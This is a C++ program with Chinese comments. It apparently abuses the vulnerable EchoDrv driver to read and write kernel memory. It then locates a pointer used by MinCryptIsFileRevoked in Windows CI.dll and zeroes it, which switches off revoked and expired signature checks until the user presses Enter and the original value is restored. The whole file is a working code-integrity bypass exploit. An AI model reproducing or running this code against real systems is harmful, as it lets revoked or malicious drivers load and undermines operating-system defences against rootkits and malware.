// KRW.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <vector>
#include "echodrv.h"
#include "pdb.h"

#pragma comment(lib,"pdb.lib")

void SearchMemoryBlock(WORD* Tzm, WORD TzmLength, UCHAR* MemoryData, size_t size,
    std::vector<ULONG64>& ResultArray);
WORD GetTzmArray(const char* Tzm, WORD* TzmArray);
void GetNext(short* next, WORD* Tzm, WORD TzmLength);
NTSTATUS EnumKernelModules(
    _Out_ PRTL_PROCESS_MODULES* Modules
);

short Next[260];

int main(int argc,const char* argv[]){
    HANDLE hDevice = INVALID_HANDLE_VALUE;

    hDevice = CreateFile(L"\\\\.\\EchoDrv", GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        NULL,
        NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cout << "Invalid handle on CreateFileA!" << std::endl;
        //Get the last error from windows for CreateFile
        std::cout << "Error code: " << GetLastError() << std::endl;
        return -1;
    }

    BOOL success = EchoDrvRegisterDriver(hDevice, nullptr);
    if (!success) {
        std::cout << "Failed to register driver!" << std::endl;
        return 1;
    }

    PRTL_PROCESS_MODULES Modules;
    EnumKernelModules(&Modules);

    ULONG_PTR CI_base = NULL;
    for (size_t i = 0; i < Modules->NumberOfModules; i++)
    {
        if (strstr((char*)Modules->Modules[i].FullPathName, "CI.dll"))
        {
            printf("%s : %p\n", Modules->Modules[i].FullPathName, Modules->Modules[i].ImageBase);
            CI_base = (ULONG64)Modules->Modules[i].ImageBase;
        }
    }
    

    if (CI_base) {
        auto func_index = GetFuncAddress("C:\\Windows\\System32\\CI.dll", "MinCryptIsFileRevoked");
        if (func_index)
        {
            ULONG64 func_addr = CI_base + func_index;
            UCHAR mem_map[100] = { 0 };
            if (EchoDrvReadVirtualMemory(hDevice, func_addr, mem_map, 100)) {
                const char* tzm = "0F 82 ?? ?? ?? ?? 4C";
                WORD tzmLength = strlen(tzm) / 3 + 1;
                WORD* tzmArray = new WORD[tzmLength];

                GetTzmArray(tzm, tzmArray);
                GetNext(Next, tzmArray, tzmLength);

                std::vector<ULONG64> resultArray;
                SearchMemoryBlock(tzmArray, tzmLength, mem_map, 100, resultArray);
                if (resultArray.size() > 0)
                {
                    auto val = *reinterpret_cast<ULONG*>(&mem_map[resultArray[0] + 9]);
                    auto addr = val + resultArray[0] + 13 + func_addr;
                    printf("ppPointer: 0x%llX\n", addr);

                    ULONG64 data = 0;
                    if (!EchoDrvReadVirtualMemory(hDevice, addr, &data, 8)) {
                        printf("读取地址失败!\n");
                        return -1;
                    }

                    ULONG64 value = data;
                    printf("value: 0x%llX\n", data);

                    ULONG64 new_val = 0;
                    if (!EchoDrvWriteVirtualMemory(hDevice, addr, &new_val, 8))
                    {
                        printf("关闭过期签名检测失败!\n");
                        return -1;
                    }

                    if (!EchoDrvReadVirtualMemory(hDevice, addr, &value, 8)) {
                        printf("读取地址失败!\n");
                        return -1;
                    }
                    printf("new value: 0x%llX\n", value);

                    printf("等待中，回车还原!\n");
                    getchar();
                    if (EchoDrvWriteVirtualMemory(hDevice, addr, &data, 8))
                    {
                        printf("还原成功!\n");
                    }
                }
            }
            CloseHandle(hDevice);
        }
        else {
            printf("符号获取失败\n");
        }
    }


    EchoDrvUnregisterDriver(hDevice, nullptr);

    system("pause");
}




//特征码转字节集
WORD GetTzmArray(const char* Tzm, WORD* TzmArray)
{
    int len = 0;
    WORD TzmLength = strlen(Tzm) / 3 + 1;

    for (int i = 0; i < strlen(Tzm); )//将十六进制特征码转为十进制
    {
        char num[2];
        num[0] = Tzm[i++];
        num[1] = Tzm[i++];
        i++;
        if (num[0] != '?' && num[1] != '?')
        {
            int sum = 0;
            WORD a[2];
            for (int i = 0; i < 2; i++)
            {
                if (num[i] >= '0' && num[i] <= '9')
                {
                    a[i] = num[i] - '0';
                }
                else if (num[i] >= 'a' && num[i] <= 'z')
                {
                    a[i] = num[i] - 87;
                }
                else if (num[i] >= 'A' && num[i] <= 'Z')
                {
                    a[i] = num[i] - 55;
                }

            }
            sum = a[0] * 16 + a[1];
            TzmArray[len++] = sum;
        }
        else
        {
            TzmArray[len++] = 256;
        }
    }
    return TzmLength;
}

//获取Next数组
void GetNext(short* next, WORD* Tzm, WORD TzmLength)
{
    //特征码(字节集)的每个字节的范围在0-255(0-FF)之间，256用来表示问号，到260是为了防止越界
    for (int i = 0; i < 260; i++)
        next[i] = -1;
    for (int i = 0; i < TzmLength; i++)
        next[Tzm[i]] = i;
}

void SearchMemoryBlock(WORD* Tzm, WORD TzmLength, UCHAR* MemoryData, size_t size, 
    std::vector<ULONG64>& ResultArray)
{

    for (int i = 0, j, k; i < size;)
    {
        j = i; k = 0;

        for (; k < TzmLength && j < size && (Tzm[k] == MemoryData[j] || Tzm[k] == 256); k++, j++);

        if (k == TzmLength)
        {
            ResultArray.push_back(i);
        }

        if ((i + TzmLength) >= size)
        {
            return;
        }

        int num = Next[MemoryData[i + TzmLength]];
        if (num == -1)
            i += (TzmLength - Next[256]);//如果特征码有问号，就从问号处开始匹配，如果没有就i+=-1
        else
            i += (TzmLength - num);
    }
}

NTSTATUS EnumKernelModules(
    _Out_ PRTL_PROCESS_MODULES* Modules
)
{
    NTSTATUS status;
    PVOID buffer;
    ULONG bufferSize = 2048;

    buffer = malloc(bufferSize);

    HINSTANCE ntdll_dll = GetModuleHandleA("ntdll.dll");

    if (ntdll_dll == NULL) {
        return -1;
    }

    NTQUERYSYSTEMINFORMATION ZwQuerySystemInformation = NULL;

    ZwQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(ntdll_dll, "ZwQuerySystemInformation");
    if (!ZwQuerySystemInformation)
    {
        return -1;
    }

    status = ZwQuerySystemInformation(
        11,
        buffer,
        bufferSize,
        &bufferSize
    );

    if (status == 0xC0000004)
    {
        //PhFree(buffer);
        free(buffer);
        buffer = NULL;
        buffer = malloc(bufferSize);

        status = ZwQuerySystemInformation(
            11,
            buffer,
            bufferSize,
            &bufferSize
        );
    }

    *Modules = (PRTL_PROCESS_MODULES)buffer;
    return status;
}